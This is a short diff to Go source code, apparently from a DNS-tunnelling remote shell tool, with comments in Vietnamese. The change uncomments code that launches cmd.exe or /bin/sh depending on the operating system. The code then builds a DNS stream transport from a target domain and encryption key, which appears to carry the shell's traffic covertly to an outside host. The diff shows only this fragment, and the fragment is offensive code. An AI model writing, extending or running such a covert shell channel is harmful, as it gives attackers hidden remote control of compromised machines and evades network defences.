@@ -3,6 +3,7 @@ package main
 import (
 	"ipwf/lib/transport"
 	"os/exec"
+	"runtime"
 )
 
 // khởi tạo 2 mảng chứa tên miền và encryptionKey
@@ -16,12 +17,12 @@ func main() {
 	var cmd *exec.Cmd
 
 	// // kiểm tra nếu bằng window thì sử dụng cmd.exe
-	// if runtime.GOOS == "windows" {
-	// 	cmd = exec.Command("cmd.exe")
-	// } else {
-	// 	// nếu khác window thì sử dụng mặc định của unix
-	// 	cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
-	// }
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe")
+	} else {
+		// nếu khác window thì sử dụng mặc định của unix
+		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
+	}
 
 	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
